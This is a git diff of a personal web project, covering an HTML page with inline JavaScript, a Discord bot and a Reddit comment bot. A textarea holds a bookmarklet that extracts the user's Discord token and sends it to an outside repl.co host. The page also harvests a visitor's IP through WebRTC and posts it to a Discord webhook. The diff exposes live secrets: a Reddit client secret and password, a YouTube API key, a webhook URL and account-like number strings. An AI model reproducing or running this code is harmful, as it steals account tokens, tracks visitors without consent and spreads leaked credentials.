@@ -32,7 +32,19 @@ a { color: #white; text-decoration: none; }
 body { background-image: url("background2.jpg"); }
 #auto_hide_div img { width: 6vw; } }</style>
 
-<!--object-fit: contain; word-break: break-all; grid-template-columns: 1px 1ch 1fr;-->
+<!--
+prdc
+mightbond
+insect spray
+pagibig
+onlinejobs
+probe group philippines inc
+
+music test
+layout of ip mbps btc
+post test
+
+object-fit: contain; word-break: break-all; grid-template-columns: 1px 1ch 1fr;-->
 
 <div class="menu" style="user-select: none;">
 <ul style="justify-content: space-between; display: flex;">
@@ -90,9 +102,9 @@ body { background-image: url("background2.jpg"); }
 <div id="home"></div>
 <div id="result"></div>
 
-<button id="crypto_position">BTC</button>
-<button id="user_ip">IP</button>
-<button id="progress">MBPS</button>
+<button id="crypto_position" onclick="binance_search()">BTC</button>
+<button id="user_ip" onclick="get_user_ip(function(temp_ip) { user_ip.innerHTML = temp_ip; discord_webhook(`IP: ${temp_ip}`) })">IP</button>
+<button id="progress" onclick="speedtest_init()">MBPS</button>
 
 <div id="f" onclick="reddit_comment()">
 <img src="book1.jpg">
@@ -125,16 +137,10 @@ body { background-image: url("background2.jpg"); }
 <input id="message" placeholder="Message">
 <button type="submit" onclick="get_posts(document.querySelector('#user').value, document.querySelector('#message').value)">Send</button>
 </form>
-<button id="posts">Posts</button>
+<button id="posts" onclick="get_posts()">Posts</button>
 </div>
 
-<textarea class="auto_resize">
-onlinejobs
-probe group philippines inc
-mightbond
-insect spray
-
-client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
+<textarea class="auto_resize">client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
 
@@ -158,7 +164,7 @@ ishka224 = ["stmR61381", "R33130",
 "ggl7662 1163 9595 6926 2054 8251 4102 6053 9158 3180 0404 8284 4943 2686 7622 7896 8335 2880 5739 8217",
 "3656 4214 3532 9860 3133 5908 6863 1497 6396 5660 4062 8653 7200 1526 8872 6796 0088 2064 7476 7102",
 "4865 7378 8520 8993 4653 5574 3520 7851 9890 4832 4612 2659 9746 8448 3709 2841 4385 5762 9126 6509",
-"aub5457", "sec3349", "mtr2343909003963", "slp202303-19575B"]
+"aub5457", "sec3349", "mtr2343909003963", "sai202303-19575B"]
 
 express = require("express")
 app = express()
@@ -227,9 +233,11 @@ webhook = await client.channels.cache.get(general_id).createWebhook(client.user.
 axios.get(`https://discordapp.com/api/v6/entitlements/gift-codes/${code}?with_application=false&with_subscription_plan=true`).then(async res => {
 await webhook.send({ content: `**${message.author.tag} | ${message.guild} | ${message.channel}**\n${client.user} Status: Good\n${message.content}` }).then(() => { webhook.delete() }) }).catch(async err => {
 await webhook.send({ content: `**${message.author.tag} | ${message.guild} | ${message.channel}**\n${client.user} Status: Bad\n${message.content}` }).then(() => { webhook.delete() }) }) }
+
 if(message.content.toLowerCase() === `<@${client.user.id}>` || message.content.toLowerCase() === `<@${owner_id}>`) {
 axios.get("https://animechan.vercel.app/api/random").then(res => {
 setTimeout(() => { message.reply({ content: `${res.data.quote}` }) }, 4000) }) }
+
 if(copy && message.author.id === last_mention && message.channel.id === last_channel) {
 copy = false, last_mention = null, last_channel = null
 if(message.attachments.size > 0) { file = new Discord.MessageAttachment(message.attachments.first().url)
@@ -242,6 +250,7 @@ switch(message.content.toLowerCase()) {
 case '-lock': spam ? spam = false : spam = true; break
 case '-nitro': nitro ? nitro = false : nitro = true; break
 case '-reset': file = JSON.parse(fs.readFileSync('index.json', 'utf8')); file.ids = []; fs.writeFileSync('index.json', JSON.stringify(file, null, 4)); break } }
+
 switch(message.content.toLowerCase()) {
 case '-link': message.channel.send(link); break }
 if(message.content.toLowerCase().includes('copy')) { member = message.mentions.members.first()
@@ -558,84 +567,84 @@ server()
 import praw, os, csv, re, time, requests, json
 from datetime import datetime
 
-reddit = praw.Reddit(client_id = 'kUuoAm5P7Ja5ZTiORwGAqQ', client_secret = 'aMBkdi6RtM-Ug1q3ZXi0Gs0NdCsZrA', username = 'hakkush', password = 'louise224', user_agent = '<ReplyCommentBot1.0>')
+reddit = praw.Reddit(client_id = "kUuoAm5P7Ja5ZTiORwGAqQ", client_secret = "aMBkdi6RtM-Ug1q3ZXi0Gs0NdCsZrA", username = "hakkush", password = "louise224", user_agent = "<ReplyCommentBot1.0>")
 
-path = "./storage/shared/download/file/file.json"
-path2 = "./storage/shared/download/file/file.csv"
+path = "storage/shared/download/file/file.json"
+path2 = "storage/shared/download/file/file.csv"
 
 def clean_string(raw_string):
     cleaned_string = raw_string.lower()
-    cleaned_string = re.sub(r'[^A-Za-z0-9 ]+', '', cleaned_string)
+    cleaned_string = re.sub(r"[^A-Za-z0-9 ]+", "", cleaned_string)
     return cleaned_string
 
 class client:
     def __init__(self, filename):
         self.response_list = []
-        with open(path, 'r', encoding='utf8') as file:
+        with open(path, "r", encoding="utf8") as file:
             file = json.load(file)
-            if 'response_list' not in file:
+            if "response_list" not in file:
                 with open(filename) as csv_file:
-                    csv_reader = csv.reader(csv_file, delimiter=',')
+                    csv_reader = csv.reader(csv_file, delimiter=",")
                     for row in csv_reader:
-                        self.response_list.append({'phrase': clean_string(row[0]), 'reply': row[1]})
-                file['response_list'] = self.response_list
-                print('online 1')
+                        self.response_list.append({"phrase": clean_string(row[0]), "reply": row[1]})
+                file["response_list"] = self.response_list
+                print("data added")
             else:
-                self.response_list = file['response_list']
-                print('online 2')
-        with open(path, 'w', encoding='utf8') as f:
+                self.response_list = file["response_list"]
+                print("data loaded")
+        with open(path, "w", encoding="utf8") as f:
             json.dump(file, f, indent=4)
 
     def find_match(self, comment):
         for i, dictionary in enumerate(self.response_list):
 
-            if dictionary['phrase'] in clean_string(comment.body):
+            if dictionary["phrase"] in clean_string(comment.body):
                 if self.cool_down(i):
                     self.make_reply(i, comment)
 
-            elif 'hakkushtest' in clean_string(comment.body):
-                response = requests.get('https://api.binance.com/api/v3/ticker/24hr?symbol=SLPUSDT')
+            elif "hakkushtest" in clean_string(comment.body):
+                response = requests.get("https://api.binance.com/api/v3/ticker/24hr?symbol=SLPUSDT")
                 json_data = json.loads(response.text)
-                symbol = json_data['symbol'].split('USDT')[0]
-                price = round(float(json_data['lastPrice']), 5)
-                percent = round(float(json_data['priceChangePercent']), 2)
-                comment.reply(body=f'**{symbol} | ${price} | {percent}%**')
+                symbol = json_data["symbol"].split("USDT")[0]
+                price = round(float(json_data["lastPrice"]), 5)
+                percent = round(float(json_data["priceChangePercent"]), 2)
+                comment.reply(body=f"{symbol} | ${price} | {percent}%")
 
     def cool_down(self, i):
         dictionary = self.response_list[i]
-        if 'last_posted' not in dictionary.keys():
+        if "last_posted" not in dictionary.keys():
             return True
         else:
             now = datetime.now()
-            duration = now - datetime.fromtimestamp(dictionary['last_posted'])
+            duration = now - datetime.fromtimestamp(dictionary["last_posted"])
             duration_seconds = duration.total_seconds()
             hours = divmod(duration_seconds, 3600)[0]
             if hours >= 24:
                 return True
             else:
-                print('cooldown: ' + str(24 - hours) + ' phrase: ' + dictionary['phrase'])
+                print("cooldown: " + str(24 - hours) + " phrase: " + dictionary["phrase"])
         return False
 
     def make_reply(self, i, comment):
         dictionary = self.response_list[i]
         try:
-            comment.reply(body=dictionary['reply'])
+            comment.reply(body=dictionary["reply"])
             print(comment.body)
-            print(dictionary['phrase'])
-            print(dictionary['reply'])
+            print(dictionary["phrase"])
+            print(dictionary["reply"])
             time.sleep(60 * 60 * 3)
         except Exception as e:
             print(e)
         now = datetime.now()
-        self.response_list[i]['last_posted'] = now.timestamp()
-        with open(path, 'r', encoding='utf8') as file:
+        self.response_list[i]["last_posted"] = now.timestamp()
+        with open(path, "r", encoding="utf8") as file:
             file = json.load(file)
-            file['response_list'] = self.response_list
-        with open(path, 'w', encoding='utf8') as f:
+            file["response_list"] = self.response_list
+        with open(path, "w", encoding="utf8") as f:
             json.dump(file, f, indent=4)
 
 bot = client(path2)
-subreddit = reddit.subreddit('test')
+subreddit = reddit.subreddit("test")
 for comment in subreddit.stream.comments(skip_existing=True):
     bot.find_match(comment)
 
@@ -643,8 +652,8 @@ import discord, requests, json, os, random, string, time
 from discord.ext import commands
 from datetime import datetime
 
-#filePath = 'storage/shared/download/file/file'
-filePath = 'file'
+#filePath = "storage/shared/download/file/file"
+filePath = "file"
 
 def prefix(bot, message):
     with open(filePath, 'r', encoding='utf-8') as file:
@@ -1386,14 +1395,10 @@ body = document.querySelector("body")
 global_url = "background.jpg"
 download_bytes = 2750000
 
-window.addEventListener("load", () => {
-play_music(music_list[Math.floor(Math.random() * music_list.length)].name)
-binance_search()
-get_posts() })
+window.addEventListener("load", () => play_music())
 
 radios = document.querySelectorAll(".sort")
-for(radio in radios) {
-radios[radio].onchange = function() {
+for(radio in radios) { radios[radio].onchange = function() {
 if(this.value === "sort1") f.style.display = "block"
 else if(this.value === "sort2") f.style.display = "none" } }
 
@@ -1416,14 +1421,12 @@ localStorage.clear(); location.reload() }
 anime_query = []
 anime_liblary = { M: "Manga", A: "Anime", J: "Japan", K: "Korea", C: "China", S: "Short", F: "Film", R: "Rated", _: "Series" }
 anime_liblary_2 = { D: "No Data", _: "Verified" }
-function anime_search(query) {
-run = true
+function anime_search(query) { run = true
 if(!query) query = mkush[Math.floor(Math.random() * mkush.length)].t.match(/.../).join("")
 div = document.createElement("div")
 mkush.forEach(mm => {
 if(mm.t.toLowerCase().includes(query.toLowerCase())) {
-if(!anime_query.includes(mm.t+mm.p) && run) {
-run = false
+if(!anime_query.includes(mm.t+mm.p) && run) { run = false
 anime_query.push(mm.t+mm.p)
 axios.get(`https://api.jikan.moe/v4/anime?q=${mm.t}`)
 .then(res => img_element(res.data.data[0].images.jpg.image_url))
@@ -1439,13 +1442,11 @@ res.data.links.forEach(link => img_element(link))
 result.replaceChildren(div) }
 
 const seen_videos = []
-function youtube_search(query) {
-run = true
+function youtube_search(query) { run = true
 div = document.createElement("div")
 axios.get(`https://www.googleapis.com/youtube/v3/search?key=AIzaSyDf0ZX9wHtlKDuwNAepO-GrctBmOI_Y0qE&q=${query}`).then(res => {
 res.data.items.forEach(item => {
-if(!seen_videos.includes(item.id.videoId) && run) {
-run = false
+if(!seen_videos.includes(item.id.videoId) && run) { run = false
 seen_videos.push(item.id.videoId)
 iframe_element(`https://www.youtube.com/embed/${item.id.videoId}`) } }) })
 result.replaceChildren(div) }
@@ -1456,8 +1457,7 @@ if(temp_posts_seens) posts_seen = temp_posts_seens.split(",")
 post_comments = []
 seen_comments = []
 comment_index = 0
-function reddit_search(query, sort) {
-post_filter = true
+function reddit_search(query, sort) { post_filter = true
 div = document.createElement('div')
 axios.get(`https://www.reddit.com/r/${query}/${sort}.json`).then(async res => {
 for(const post of sort === "random" ? res.data[0].data.children : res.data.data.children) {
@@ -1506,11 +1506,10 @@ result.appendChild(div) } }
 const server_request = axios.create({ baseURL: "https://v1.elusion1.repl.co", params: { token: "kish" } })
 res_length = 0
 async function get_posts(user, message) {
+posts.innerHTML = "Loading..."
 posts_div = document.createElement("div")
-if(user && message) res = await Promise.all([
-server_request.get("/messages", { params: { a: user, c: message } }) ])
-else res = await Promise.all([
-server_request.get("/messages") ])
+if(user && message) res = await Promise.all([ server_request.get("/messages", { params: { a: user, c: message } }) ])
+else res = await Promise.all([ server_request.get("/messages") ])
 if(res[0].data.links.length === 0) return
 if(res[0].data.links.length === res_length) return
 res_length = res[0].data.links.length
@@ -1543,9 +1542,6 @@ req.open("POST", "https://discord.com/api/webhooks/1005744977801912450/SRhxYTMUk
 req.setRequestHeader("Content-Type", "application/json")
 req.send(JSON.stringify({ "username": "Ishkafel", "content": message, "avatar_url": "https://media.discordapp.net/attachments/1002059651690528860/1026859531206131752/IMG_20221004_221117.jpg" })) }
 
-get_user_ip(function(temp_ip) {
-user_ip.innerHTML = temp_ip
-discord_webhook(`IP: ${temp_ip}`) })
 function get_user_ip(new_temp_ip) {
 peer_connection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection
 pc = new peer_connection({ iceServers: [] })
@@ -1569,15 +1565,7 @@ if(!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidat
 ice.candidate.candidate.match(ip_regex).forEach(iterate_ip) } }
 
 function speedtest_show_progress(message) {
-if(console) {
-if(typeof message === "string") {
-console.log(message)
-} else {
-for(let i = 0; i < message.length; i++) {
-console.log(message[i]) } } }
-if(progress) {
-html_message = (typeof message === "string") ? message : message.join("<br>")
-progress.innerHTML = html_message } }
+if(progress) { progress.innerHTML = (typeof message === "string") ? message : message.join("<br>") } }
 function speedtest_init() {
 speedtest_show_progress("KISH")
 window.setTimeout(speedtest, 1) }
@@ -1588,7 +1576,7 @@ download.onload = function () {
 end_time = (new Date()).getTime()
 speedtest_result() }
 download.onerror = function (err, msg) {
-speedtest_show_progress("Error") }
+speedtest_show_progress("MBPS") }
 start_time = (new Date()).getTime()
 cacheBuster = "?nnn=" + start_time
 download.src = global_url + cacheBuster
@@ -1599,7 +1587,6 @@ speed_bps = (bits_loaded / duration).toFixed(2)
 speed_kbps = (speed_bps / 1024).toFixed(2)
 speed_mbps = (speed_kbps / 1024).toFixed(2)
 speedtest_show_progress([speed_mbps + " MBPS"]) } }
-speedtest_init()
 
 auto_type_word = ""
 auto_type_index = 0
@@ -1627,7 +1614,7 @@ auto_hide_div.style.visibility = "visible" } ) } )
 
 function binance_search(query) {
 axios.get(`https://api.binance.com/api/v3/ticker/24hr?symbol=${query || 'BTC'}USDT`)
-.then(res => crypto_position.innerHTML = `${res.data.symbol.split("USDT")[0]}-${parseFloat(res.data.lastPrice).toFixed(2)}(${parseFloat(res.data.priceChangePercent).toFixed(2)}%)`) }
+.then(res => crypto_position.innerHTML = `${res.data.symbol.split("USDT")[0]} | ${parseFloat(res.data.lastPrice).toFixed(2)} | ${parseFloat(res.data.priceChangePercent).toFixed(2)}%`) }
 
 mode_selector.onchange = event => {
 if(event.target.value.toLowerCase() === "nightmode") {
@@ -1671,6 +1658,7 @@ chat.style.display = "none" } }
 
 last_music = ""
 function play_music(music) {
+if(!music) music = music_list[Math.floor(Math.random() * music_list.length)].name
 if(music === last_music) return
 last_music = music
 show_indicator("playing_indicator")
